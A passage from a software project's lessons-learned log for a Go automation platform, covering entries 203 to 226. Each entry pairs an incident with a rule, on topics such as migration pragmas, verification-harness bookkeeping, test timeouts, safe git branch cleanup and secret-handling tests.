**The incident.** On 2026-09-18, a branch of work spanning three sessions reached a handoff with seventy new Go files (sources and tests alike) that had no doc comment above their package clause. `tools/commitgate` refuses exactly that for every file a commit adds, so the planned commits would all have been refused the first time the user ran `git commit`, far from the sessions that wrote the files. Nothing earlier noticed: the build, vet, gofmt, gosec, docs-lint and every test pass without a file comment, and the tests of the tracked files around them predate the rule and have none, so copying their shape reproduced the gap.

**The rule.** The commit gate is a gate on the branch too. Before calling a branch of uncommitted work ready, check its new files against what the gate enforces on added files (a doc comment above the package clause, gofmt, no em dash in an added line), since that is the one check that runs only at commit time. A small parser over `git ls-files -o` (go/parser, `ParseComments|PackageClauseOnly`, `Doc == nil`) answers it in a second without staging anything.

## 204. When a yes-or-no about a method starts to depend on its arguments, put the per-call answer beside the flag

**The incident.** On 2026-09-19, `exec.command` gained a check for calls guarded by `creates` or `removes`. Its manifest's `SupportsCheck` had to become true for any guarded call to be checked, and at once `pleiades validate` accepted `check_mode: true` on an unguarded `exec.command`, a call that can only ever be reported unchecked, which is exactly what the `check_mode` key promises not to do. The CLI key gate caught it, because it expected the old refusal. A method-level boolean cannot say "some calls": whichever way it is set, it is wrong for some of them.

**The rule.** When an answer about a method starts to depend on the call, add the per-call answer next to the flag rather than bending the flag: a function of the call's own inputs, which every plan-time consumer asks, and which the run-time code calls too, so the two cannot drift (`Descriptor.CheckCall`, used by `engine.Checkable` and called by the method's own `Check`). Keep the flag for what it can still say truthfully ("supports check at all"), and let generated documentation say "for some calls" when the function is present.

## 205. Check whether an environment variable is set without ever printing its value

**The incident.** On 2026-09-19, a shell test meant to report whether `LOCALSTACK_AUTH_TOKEN` was set used `${VAR:+set}${VAR:-unset}`. When the variable is set, the second expansion is its value, so the command printed "set" followed by the token, and a `cut` trimmed only its tail. Part of a real credential reached the session's output.

**The rule.** To learn whether a secret-bearing variable is set, use an expansion that cannot yield the value: `[ -n "${VAR:-}" ] && echo set || echo unset`, or `${VAR:+set}` alone. Never pair `:+` with `:-` on a secret, and never pipe a secret's expansion through `cut` or `sed` expecting it to be removed. If a value does leak, say so to the user and recommend rotating it.

## 206. Close a documentation gate by writing from the code, because that is where the defects are

**The incident.** On 2026-09-19, closing the "easy" documentation gates of early phases, the gate for inventory classification and quarantine was written by reading the code rather than the existing docs. The code contradicted the docs in three places and, in following it, three defects surfaced that no test had caught: a device update that answered 200 and stored nothing (so no device could be promoted), a re-sync that silently reverted a promotion, and a read-only sync that hid the only list naming quarantined records. The dispatch gate, written the same way, found job ids that broke the list's ordering and a runner behavior (a failed run re-runs up to five times) the docs described the opposite of. Correcting stale test citations in the plan found a symlink escape in project playbooks.

**The rule.** A documentation gate is closed by describing what the code does, with each claim checked against the code, and every surprising claim proven by running it before it is written down. A statement that cannot be proven is either a bug to fix first or a limit to state, never prose copied forward from an older page. Treat "easy" bookkeeping (a stale citation, an unticked gate) as a reason to look, not as a checkbox.

## 207. A session setting written inside a migration file is not a setting the migration runs under

**The incident.** On 2026-09-19, planning the launchable seam meant adding a migration that rebuilds `schedules`. Reading how rebuilds were applied showed that `PRAGMA foreign_keys = off`, which opens every SQLite migration that rebuilds a table, had never once taken effect: the applier ran each script inside a transaction, where that pragma is a documented no-op, and SQLite declines it in silence. Thirty migrations had been written against a guarantee they never had. A populated database upgrading through migration 0022 lost every authored survey question and saved launch configuration, and one holding a schedule or a job task could not upgrade at all. Nothing caught it because every migration test started from an empty database, where a table rebuild cannot hurt anybody (FAILURE_PATTERNS.md #266).

**The rule.** When behavior depends on a setting whose scope is a connection or a transaction, set it in the code that owns the connection, before the transaction opens, and read it back: the failure mode of a declined session setting is silence, not an error. Never trust a pragma, `SET`, or timeout written in a data file to apply to the statements around it. And a test for a schema migration must start from a database that holds rows, because an empty one exercises the DDL and nothing else.

## 208. One registry, one question: check what a key actually decides before treating it as the abstraction

**The incident.** On 2026-09-19, Phase 21's last open item was "rebind schedules, workflow nodes and notification policies to Launchable". Phase 23 had already recorded schedules as done on the strength of `launch.Kind` being an open registry: a schedule attached to a Template, a Template carried its kind, so "one edge covers every launchable kind". Every word of that was true and it answered the wrong question. A Kind says which ENGINE runs a definition, native runbook or sandboxed ansible-playbook. What a schedule has to name is which OBJECT to run, and a project sync is not a Template of any kind, so a project could not be scheduled at all and nothing in the design said why not. The roadmap had recorded the distinction as two axes a year earlier (`.SPECIFICATION/AWX_PARITY_ROADMAP.md` section 1.1) and the code had quietly conflated them anyway, including in an interface named for both that no production code ever consumed.

**The rule.** Before treating a registry as the abstraction its consumers bind to, write down the question its key answers, in one sentence, and check it against what each consumer actually needs to ask. Two questions that happen to have the same answer today (every launchable was a template) will separate later, and the registry will be the thing in the way. The tell is an interface or key named for a category rather than for a question: "kind", "type", "mode". Name it for the question ("which engine", "what sort of object") and a consumer that needs the other one becomes obvious immediately rather than after a phase has closed on it.

**The corollary, from the same session.** An abstraction with no consumer is not evidence of anything. `launch.Launchable` existed, satisfied one type and was consumed by nothing, which is how it stayed wrong through three phases that all cited it.

## 209. Ask the library how it will read an input, rather than writing a second parser to guess

**The incident.** On 2026-09-20, adding an allowlist for the addresses a project may be fetched from, the obvious implementation was to parse the URL with `net/url` and check the scheme. That would have been wrong in three ways at once, and go-git's own parser says so: a string with no scheme is not an error but a LOCAL PATH, absolutized against the process's working directory; `git@github.com:org/repo.git` is ssh with no scheme in sight; and `srv:secrets-repo` is also ssh, with `srv` as the host. A `net/url` check would have called the first two something else and the third a relative path, and the validator would have been confidently disagreeing with the code that dials. The implementation instead calls `transport.NewEndpoint`, the same function the transport layer calls, and allowlists the protocol it reports.

**The rule.** When validating an input that a library will later interpret, validate by asking that library what it will make of it. A second parser is a second opinion, and the two only have to differ once for the check to be decorative. This is the same failure shape as a validator that reimplements a grammar, and this repository has recorded it twice before under other names.

**The corollary.** Having asked, write down what the answer was, because it is usually surprising. The test table for this validator exists as much to record that a bare path is local and that anything with a colon is a host as it does to check the allowlist: the next person to touch the rule needs that more than they need the rule.

## 210. A plan's own claims about the code are evidence about when it was written, not about the code

**The incident.** On 2026-09-20, building Phase 78d from a stage plan written five days earlier, three of its claims about the codebase turned out to be wrong, and each would have produced a different defect if it had been built on rather than checked.

It said the three catalog packages that reach a Windows host would "inherit the capability with no edit of their own, which is the argument for putting it in `pkg/winrmexec`". All three build their `Auth` from raw string literals (`secrets["username"]`), so all three needed editing, and the argument the sentence rests on only became true once a shared `AuthFromSecrets` was added for them to call. Building on the claim would have shipped a transport that supports certificates and three callers that cannot pass one.

It said one new secret key lands in two places. It lands in three: `pkg/wire`, `internal/credential` and `internal/credtype` each declared the same literals, and only two of the three were held together by a test. The third copy would have drifted with nothing watching.

It named `internal/catalog/http` as the cheaper fallback consumer if a Windows host proved unavailable. That package has no `InjectSecrets` call at all and builds a `tls.Config` only on its skip-verification branch, so choosing it means building a credential channel from scratch: more work than the option it was offered as an alternative to, not less.

**The rule.** Treat a plan's factual claims about code the way you would treat a comment: as something that was true when somebody looked, aimed at the question they were asking then. Before building on one, re-read the source it describes. The cost is a few minutes per claim and the saving is not the time, it is that a wrong premise does not produce a visible failure. It produces working code that solves a slightly different problem, which nothing downstream will catch.

**The corollary, which is the more useful half.** A fourth stale claim pointed the other way: the AWX parity test constrains only SHIPPED credential types, so the certificate type can be user-defined and needs no exemption, and a blocker the plan treated as a precondition simply was not one. So of four corrections, three made the work bigger and one removed work entirely. A stale plan is not reliably pessimistic or reliably optimistic, so "check the claims that would cost me" is not a filter worth applying; check the ones the work rests on, in both directions.

**Corrected 2026-09-20**, because the first draft of this entry said "two of these three corrections made the work smaller" and then named, as one of the two, a correction that was not among the three it had just listed. An entry about checking claims that miscounted its own is worth fixing in place rather than quietly, and it is the same failure it describes: a number written from memory of the shape of the thing rather than from the thing.

**Write the correction into the plan rather than around it.** Each of the three is now recorded in the roadmap next to the sentence it corrects, because the next reader of that stage will otherwise re-derive the same three things, and the second derivation is exactly as expensive as the first.

## 211. A verification harness must tell "disproved" apart from "never checked", or a dead verifier reads as a clean bill of health

**The incident.** On 2026-09-20 an adversarial review of the finished Phase 78d work ran four lenses, each raising findings that three independent verifiers then tried to refute; a finding survived if fewer than two refuted it. Partway through, 78 of the 109 agents died hitting a session limit. The result came back reporting four survivors and, for two of the four lenses, ZERO survivors out of fourteen raised findings.

Zero survivors read as "that lens was clean". It was nothing of the sort. The survival test was `votes.length > 0 && refuters < 2`, so a finding whose three verifiers had all errored had zero votes, failed the first clause, and was filed as not surviving, which is the same bucket as a finding three verifiers had actively demolished. Fourteen findings were silently discarded without anyone forming an opinion on them.

The failure was only caught because the run also reported an agent error count, and the number was large enough to be obviously wrong. With two or three dead agents instead of seventy-eight, the same bug would have quietly dropped a finding or two and nothing would have looked unusual.

**The rule.** In any harness that filters candidates through a check, the absence of a verdict is a third state and must be represented as one. "Refuted", "confirmed" and "not assessed" are three answers, and collapsing the third into either of the others is a bug in the harness rather than in the run. Default the missing case to the one that costs you work, not the one that lets you stop: an unverified finding should surface as unverified, not vanish.

**The corollary, which is where this actually bites.** The temptation is strongest in exactly the harness whose job is to reduce a long list to a short one, because there the discard path is the success path and nobody reads it. Report the counts at every stage (raised, verified, refuted, unassessed) and make them add up, so a stage that silently lost work cannot balance.

**And the reporting obligation.** Having found it, say so where the result is consumed rather than only fixing the code. The two unaudited lenses are now named in the handoff as unaudited, because "the review found four things" and "the review found four things and failed to look at fourteen" support very different decisions about whether to ship.

## 212. When a transaction's own record decides a race, write that record first

**The incident.** Phase 84, 2026-09-21. Controllers starting together against one database each ran every pending migration in its own transaction: the migration's script, then the version row, then commit. The version is `schema_migrations`' primary key, so at most one of them could ever commit a migration, and the data was always safe. But the losers failed first on the winner's DDL (a table that already existed), or deadlocked with it over a foreign key's parent table, and died, because nothing told a failure caused by losing apart from a real one.

**The rule.** When a database record is what decides who did a piece of work, make writing that record the transaction's FIRST statement, before the work. A second writer then waits on the first one's uncommitted record, holding nothing the first one needs, and fails on it only once the first has committed, which is exactly when a re-read can see the answer. The loser's next step is to read again and carry on (internal/tlscert's lose-then-reload reasoning), and it needs no lock, no error classifier and no retry budget. Written last, the same record decides the same race, but the loser meets the winner's work before it meets the record, and fails in ways that do not say who won.

**The corollary.** A winner that dies releases the claim with its transaction. The one holder a database cannot release on its own is a winner cut off by a partition, which keeps its session open until TCP notices; bound that with a server-side idle-in-transaction timeout, set after the claim, so the claim's own wait stays unbounded.

## 213. A test of a protection is finished only when a run with the protection removed fails it

**The incident.** Phase 84's binary upgrade gate stops a controller behind a client that routes by readiness and asserts that no request fails, which is the shutdown drain's promise. It passed. Then the control run, with the drain set to zero, passed too. Two things hid the drain: the balancer's readiness poll was far faster than any real load balancer, and its poll loop and the test's sleep before the stop started together, so the stop always landed exactly on a poll and the stopped controller was never sent a request it could fail. With a realistic poll and the stop placed between polls, the drain-on run passed (282 requests, none failed) and the drain-off run failed (10 of 169 refused).

**The rule.** Every assertion that some protection works needs one run with the protection disabled that the assertion fails. The run is cheap, and it is the only evidence that the test measures the protection rather than the test's own timing or setup. Record it with the result ("passes with the drain, fails without it"), because "passes" alone is also what a test that measures nothing reports.

**The corollary about timing.** Two loops started at the same instant with the same period stay in lockstep. When a test sleeps a whole number of another loop's periods before acting, it acts in the same phase every time, and a race it means to exercise may never happen. Offset the action, or randomize it, and say why in the code.

## 214. A fix is not reviewed until its error paths and fallbacks are, because that is where it breaks its own rule

**The incident.** Phase 84 was built carefully: race tests across real processes on both dialects, fuzzing against an independent oracle, mutation checks that turned each gate red, and controls for the drain and the migration race. On 2026-09-22 a sequential adversarial review of the uncommitted change (six area reviewers, and a separate agent trying to refute each serious finding) still confirmed eight major defects and turned up more minor ones, ten of them recorded as FAILURE_PATTERNS 282 to 291. Most shared one shape. The fix stated a rule, and an error path or fallback quietly broke it: the sync sweep's rule was "fail only a claim whose owner is proven gone", and a failed heartbeat read answered "everyone else is gone" (#282); `ensureSQLiteWAL` promised a 0600 file, and its no-hard-link fallback handed creation to the umask (#289); the migration claim was "the one wait that must be unbounded", and it inherited a role's timeout (#288); shutdown's comment said "leave only once the syncs have stopped", and the code left either way (#291). The happy paths were proven; the paths around them were reasoned about once, when they were written, and never tested.

**The rule.** When a change states a rule (only act on what is proven, keep this file private, never bound this wait), list every path through which the code could act without the rule holding: each error return, each fallback, each default taken when a read fails, each place a comment names a condition. Each path either keeps the rule or refuses, and each has a test that fails when it does not. A mutation check of the main path says nothing about them.

**The corollary about review.** A reviewer who did not write the change finds these, because the author's model of the code is the fix, and the fallback was never part of it. Review before ticking a phase done, with each finding checked by someone trying to refute it; this one refuted one of its own major findings and kept eight.

## 215. A suite's timeout is a resource, and the gate that eats it strands real infrastructure when it runs out

**The incident.** 2026-09-22, Phase 84's first full `make test-integration`: `tests/e2e` took 1099 seconds against the 20 minute per-package timeout the Makefile sets, which is 92 percent of it. Nothing failed on time, so nothing reported it; the number was visible only in the passing line. Phase 84 had added three upgrade gates to that package: a kind cluster installed and upgraded twice, a compose stack upgraded and rolled back with the previous release's images built from its own tree, and the previous release's binary served beside this one through a balancer. The Makefile's own comment still named `internal/event` at roughly six minutes as the slowest package, which had been true when it was written.

**Why it matters more than a slow suite.** Go's per-package timeout is not a failed test. It panics the test binary and dumps every goroutine, and no `t.Cleanup` runs. For these gates that means a live kind cluster, a running compose stack and a set of containers left behind, and a failure message about goroutines rather than about the gate. The next run then meets somebody else's cluster. The timeout exists to turn a hung run into a clear answer; a value the suite has grown into turns a slow run into a mess.

**The rule.** Read the runtime of the slowest package as a number, not as a pass, and keep a written margin against the timeout. When a phase adds a gate that provisions real infrastructure, add its measured cost to that package's total and raise the timeout in the same change, in every copy of it (here: the Makefile, `tools/coverage-check` and `tools/testgate`, kept equal by `TestGoTestTimeoutMatchesMakefile`). Say in the comment what the slowest package is today and what it measured, because the next author is reading that sentence to decide whether they have room.


## 216. A configuration check belongs where the value is read, and "at startup" is an ordering claim that has to be tested as one

**The incident.** 2026-09-22, closing Phase 96d. `NATS_URL` got its scheme allowlist in the phase's first commit, whose changelog fragment shipped the sentence "`NATS_URL` is now checked at startup". The check was real, so nothing looked wrong. Read in order, `cmd/controller/main.go` reads `natsURL` at the top of `main` and first looks at it about 280 lines later, past `net.Listen`, past the `controller listening` line, past `srv.Serve` in a goroutine, past a full schema migration. So a typo'd scheme bound a port, answered 200 on `/healthz`, migrated a database, and then exited 1. On Kubernetes that is a liveness probe going green on a process that cannot work, and a migration paid for on every restart of a deployment whose URL can never work.

**Why nobody noticed.** The check was written where the value is USED, which is where a check naturally goes and which reads correctly at the call site. Everything wrong with it lives in the distance between that point and where the value was read, and nothing in a diff shows a distance. The same file already had the rule right for the Controller's own TLS, whose `resolveTLS` sits in the configuration block under a comment saying a deployment whose TLS variables contradict each other must fail before it opens a database or joins an election. The rule existed; it had simply never been applied to the connection the process makes rather than the one it serves.

**The second half, found before any code was written.** The obvious fix, moving the check up beside the env read, would have introduced a credential leak. In both composition roots that line runs before the masking logger is installed, `internal/redact` carries a `url_userinfo` rule for exactly `scheme://user:pass@host`, and the validator's messages quote the URL back. The check went immediately after the logger instead, which is still long before the listener.

**The rule, and how to test it.** Put a configuration check where the value is READ, in the block that reads it, after whatever makes logging safe and before anything expensive, shared or externally visible. And test it as the ordering claim it is: the evidence is what had NOT happened when the process exited, not that an error was eventually printed. The gates for this assert that the controller's database directory does not exist and that its listening line never appeared, and that the runner, which has neither, refused inside a fifth of `topology.ConnectWaitTimeout`. Each also carries a positive control, because a binary that refused every value would pass a refusal gate perfectly.

## 217. A gate that claims "there is no other route" must assert the route table, not the request that built it

**The incident.** 2026-09-22, Phase 96d's wss traversal gate. Its strongest proof is structural: the broker publishes no host port, so the real binaries cannot have reached it except through the terminating proxy. The fixture named no `ExposedPorts` at all, which is what publishing nothing looks like, and the plan said so in as many words. The first run failed: all three of the image's ports were published. testcontainers-go, when `ExposedPorts` is empty, inspects the IMAGE and publishes everything its `EXPOSE` declares. Naming nothing inherits the image's list; the field narrows rather than adds. A `HostConfigModifier` cannot undo it, because it runs before the port merge.

**What saved it.** Only that the claim had been written as an assertion rather than as a comment. `tests/e2e/integration_chaos_test.go` had carried the identical sentence ("Neither publishes a host port of its own: the only way in is through the proxy") in a comment for months while declaring `ExposedPorts` explicitly, and it was simply untrue; nothing read the mapped port, so nothing broke and nothing told anyone.

**The rule.** When a test's conclusion rests on the ABSENCE of a path, assert the absence against the live system rather than reasoning from the configuration that was supposed to produce it. A fixture property stated in a comment is a belief about a library's behavior, and library behavior is exactly the thing being assumed. The corollary for a layered gate: keep a second proof that speaks from the other end. This one also asks the broker itself, whose `/connz` reports each client's address and transport, so the claim survives even where the fixture cannot be made airtight.

## 218. A test that derives its fixture from repository state has to enumerate the states that state can take, including the ones the authoring branch could not produce

**The incident.** 2026-09-22, the first full integration run on the Phase 96d branch turned up three failures in Phase 84's upgrade gates and one in a catalog check test, none of them a product regression and all four real. The two upgrade failures share a shape worth naming, because the shape is what made them invisible until now.

`previousRef` decides what a build replaces by reading git: the merge base, and when that equals HEAD, a dirty tree means the uncommitted work is the build under test while a clean tree means `HEAD^1`. That logic is careful and correct. What followed it was not: with a dirty tree that adds no ent migration, `crossed` is legitimately empty, `make up` correctly takes no backup, and the next line indexed that empty list. The guard existed twenty lines earlier, wrapped around the two assertions that also depend on a crossed migration, and was simply not carried down.

It survived Phase 84 because Phase 84's branch ADDED a migration. Its author could not reach the empty path from their own working tree, however carefully they tested. The first branch afterwards that adds no migration reaches it immediately, and since this repository's standing rule is not to commit, a dirty tree is the normal state rather than the exception, so this was waiting for essentially every future session.

The Helm half of the same gate failed for an unrelated reason with the same flavor: it counted pods after a `helm upgrade --wait` that had succeeded, without excluding pods carrying a deletion timestamp. `--wait` promises the new ReplicaSet is available; it promises nothing about when the old pods are reaped, and they stay listed, in phase Running, for their grace period. So the assertion measured machine load.

**The rule.** When a test builds its fixture from repository or cluster state rather than from a literal, list the values that state can take and decide what each one means, before writing the assertion. Two questions catch most of it. Which of these states can my own branch not produce, and therefore cannot test? And for each state, is the correct outcome a pass, a failure, or a skip with a reason? An empty list is a state. A pod being deleted is a state. Neither is an error, and neither may be indexed or counted as though it were the ordinary case.

**The corollary about diagnosis.** Stashing the branch's work made the first failure pass, which read as "this branch broke it" and was wrong: a clean tree simply selects a different previous ref. A bisect-by-stash is a real control and it answers a narrower question than it appears to, because the working tree is itself an input to what these tests build. Read what the test derived, printed in its own log, before concluding from whether it passed.

## 219. `git branch -d` guards against the branch's own upstream, not against the branch you actually merged into, so its refusal is not evidence of unmerged work

**The incident.** 2026-09-23, clearing 116 local branches down to 2. `git branch --merged origin/main` listed `feature/Phase-101c-Mesh-Enforcement`, `feature/Phase-74a-NETCONF` and `feature/cisco-cli-buildout` as merged, and `git merge-base --is-ancestor` confirmed each tip was an ancestor of `origin/main`. `git branch -d` nevertheless refused all three: "not deleting branch ... that is not yet merged to `refs/remotes/origin/<branch>`, even though it is merged to HEAD."

The cause is that each had been pushed once, then had further commits land in `main` by another route, leaving the local branch ahead of its own remote-tracking ref by 7, 1 and 2 commits. Git's `-d` check consults the upstream when one is configured, and a stale remote-tracking ref makes a fully merged branch look unmerged.

The trap is what the message invites. It names `-D` as the remedy, and `-D` does not check a narrower condition, it checks nothing at all. Reaching for it converts a false alarm into a blanket disabling of the one guard standing between a bulk delete and real work, across every branch in the same command.

**The rule.** Decide deletion safety from an explicit ancestry test against the integration branch, `git merge-base --is-ancestor <branch> origin/main`, and treat `-d` as a second opinion rather than the authority. When `-d` refuses a branch that ancestry says is merged, clear the stale association with `git branch --unset-upstream <branch>` and let `-d` run its check again against HEAD. That keeps the guard live for every other branch in the batch. Reserve `-D` for branches ancestry says are genuinely unmerged, and tag them before deleting so the commits stay reachable.

**The corollary.** Run bulk deletes through `xargs` over a list git itself produces at execution time, never a list transcribed into a plan. Between planning and running, refs move.

## 220. A case-variant remote branch is invisible in `git branch -r`, so a branch inventory is not complete until the branches it hides are deleted

**The incident.** Same session. The cleanup was planned against a listing of 45 remote branches and ran to completion, deleting 43. The `git fetch --prune` that followed reported a *new* branch: `origin/Feature/path-traversal-and-wire-confidentiality`, capital `F`, which had never appeared in any listing taken while planning.

It had been on the remote the whole time. Git stores remote-tracking refs as loose files, so `refs/remotes/origin/feature/` and `refs/remotes/origin/Feature/` are two directories that a case-insensitive path lookup cannot hold at once. Only the first fetched materialized; the second was silently not created. Deleting `feature/Path-Traversal-and-Wire-Confidentiality` freed the path, and the next fetch finally wrote its case-variant sibling.

It turned out to be a duplicate sitting at `origin/main`'s exact tip with zero unique commits, so nothing was at risk. That is luck, not a property of the situation: the hidden ref could equally have been the only copy of unmerged work, and a cleanup that had reported "done" would have left it undiscovered.

**The rule.** After any bulk remote-branch deletion, run `git fetch --prune` and re-list before declaring the inventory final, because refs hidden by a case collision surface only once the colliding name is gone. More generally, never treat `git branch -r` as the authority on what the remote holds; it reports what this clone managed to write down. `git ls-remote --heads origin` asks the server and is immune to local path collisions, which makes it the right source for any count a decision rests on.

## 221. A shared helper that cleans up with `tb.Cleanup` changes the ordering every `defer` in the test depended on

Phase 101c moved 33 container starts onto one `testsupport.StartNATS`. A helper that returns a value cannot clean up with `defer`, so it must register `tb.Cleanup`, and `tb.Cleanup` runs AFTER every deferred call in the test function. Any test whose own `defer` depended on running after the resource was released silently inverts.

`internal/election`'s three-replica gate is the case that caught it. It opens `defer goleak.VerifyNone(t)` and used to terminate its container with a `defer` registered later; defers run last-in-first-out, so termination happened first, by accident, with nothing written down. Under the helper the leak check began inspecting a live container and reported testcontainers' own reaper goroutine.

The diagnosis is the part worth repeating. That failure's signature is IDENTICAL to a known flake this repository already records by name for another package, so the cheap reading was "known flake, ignore". Running the unmigrated file proved otherwise: it passed every time. A failure that matches a known-flake signature is still a regression until the unchanged code is shown to pass.

The rule: when a refactor moves a `defer` into a helper's `tb.Cleanup`, list every other `defer` in each affected test and ask which of them assumed it ran second. Where the order matters, make it explicit by registering the dependent check with `t.Cleanup` BEFORE the helper runs, so cleanup's own last-added-first-called order puts it last, and say in a comment why, because the working version and the broken version look identical.

The same applies to any repository-wide check that runs at the end of a test: a leak detector, a container-count assertion, a temp-directory sweep.

## 222. An assertion that a secret is ABSENT from storage must be structural, because encrypted storage never contains the plaintext it searches for

A release gate asserted that `controller mesh init` never stores the operator key by reading the database file and searching it for the key's bytes. It passed, and it also passed with a deliberate leak planted, because the column is sealed before it is written: the plaintext can never appear there whether or not the key was stored. It was a test that could not fail, guarding the property the whole key hierarchy exists for.

The general shape: any "X is not in the store" assertion written as a substring search is vacuous the moment that store encrypts, compresses or encodes. Worse, it reads as the strongest possible evidence, because searching the raw bytes sounds like it bypasses every abstraction.

What works instead is an assertion over something the storage keeps in the clear ON PURPOSE. nkeys prefixes a public key by its kind, and the public key is stored beside the sealed seed precisely so questions about it need no decryption, so "every stored row names an account-kind key and none names the operator's" is checkable however the seed is encrypted. Structure survives encryption; substrings do not.

The corollary is `LESSONS_LEARNED.md` #95's rule with a sharper edge: falsify an absence assertion by PLANTING the thing it denies, not by reasoning about it. Planting it here also uncovered a protection nobody had designed deliberately, a custody function that refuses a non-account seed because it derives the public key through a kind check, which is now pinned by its own test rather than left as an accident.

## 223. A subject published under a wildcard stream root is durably stored, so a new subject is a retention decision before it is a routing one

Phase 101c added a credential renewal subject and named it `pleiades.mesh.renew`, under the prefix every other subject in the platform uses. The stream is configured with `pleiades.>`, which matches any subject whose first token is `pleiades`, so a plain core publish to it took the stream from zero messages to one: every renewal in the fleet would have been retained for the outage budget's window, seven days by default and 168 at the maximum, on the stream this phase exists to stop trusting with identity material.

Nothing secret was in a request, which is exactly why it would have survived review. The hazard is that the next field added to it might be, and by then the subject's name is load bearing in grants, documentation and an operator's monitoring rules.

The subject is now `pleiades-mesh.renew`: a different first token, therefore outside the root, therefore stored nowhere. The name reads like a typo and a container test asserts the property so the obvious tidy-up fails loudly rather than quietly re-enabling retention.

The rule: when a stream captures a wildcard namespace, adding a subject under it is a DURABILITY decision, not only a routing one. Measure what the stream does with a publish before choosing the name, because the answer is a property of the server's filter rather than of the code, and the cost of being wrong is paid by the retention window rather than by a failing test.

## 224. Tamper with the FIRST character of a base64 segment, never the last, because the last one is padding

`FAILURE_PATTERNS.md` #75 recorded a JWT forgery test that flipped base64 padding bits instead of the signature and therefore caught a forgery that had never been forged. Phase 101c wrote the identical bug in a different package, in a test whose whole purpose was to prove the broker validates a signature chain.

The arithmetic is why it keeps happening. Base64 encodes three bytes as four characters, so unless a value's length is a multiple of three the final character carries fewer than six meaningful bits. An Ed25519 signature is 64 bytes: 86 base64url characters, 516 bits, four of which decode to nothing. Flip the last character and roughly two thirds of the time you have changed nothing at all.

Both times the failure presented as a security alarm that was false, and both times it was intermittent, which is the worst combination available: alarming, unreproducible on demand, and wrong in the alarming direction. Somebody will eventually "fix" it by loosening the assertion.

The rule: when a test must alter an encoded value by one character, alter the FIRST one. Its bits are always significant regardless of length. Where a test flips a byte inside the decoded value instead, that is better still, because it needs no reasoning about encoding at all. And when a security assertion fails intermittently, suspect the test's own mutation before believing the finding: a forgery check that passes most of the time is usually not forging anything.

## 225. A wait strategy's deadline cannot be extended by wrapping it, because a nested deadline still fires first

testcontainers builds `wait.ForAll(...).WithDeadline(d)`, and `MultiStrategy.WaitUntilReady` runs its children under `context.WithTimeout(ctx, d)`. A child context's deadline is the earlier of its own and its parent's, so an outer two minute `ForAll` wrapped around a module's inner sixty second one gives up at sixty. The fix that looks right does nothing and passes review, because the outer number is the one a reader sees.

The general rule is about any nested timeout: to lengthen a timeout, REPLACE the thing that owns it; never wrap it, since the tighter bound still holds from inside. That costs restating whatever the replaced thing did, here each module's readiness condition, so name the upstream definition and version being mirrored, and pin the upstream value in a test so a dependency bump that changes it is noticed rather than silently kept as a workaround.

And sweep the SHAPE, not the instance: this was found at one postgres start and existed at twenty one, which is `FAILURE_PATTERNS.md` #301's "grep for the shape before closing the entry" in a second package.

## 226. Relaxing an equality needs a compensating assertion, and that assertion must read the world rather than the record

Comparing two clocks for equality is flaky, so the fix is a bound. But the equality was also standing in for a property, here "a run that changes nothing does not touch the file", and a bound gives that away. So a relaxed comparison needs a second assertion that keeps holding the property.

That second assertion was written first against the run's own recorded before and after, and it could not fail: `sdk.Unchanged(state)` records `Diff{Before: state, After: state}`, the same map twice, so a no-op's "after" is never observed. It is the "before" reused, and comparing the two compares a map with itself.

The rule: when checking whether something happened, read the thing it would have happened to (the file on disk), never a record the code under test wrote about itself, because the record may say "nothing changed" by construction rather than by observation. And, as ever, falsify the compensating assertion by planting exactly the fault it exists to catch.
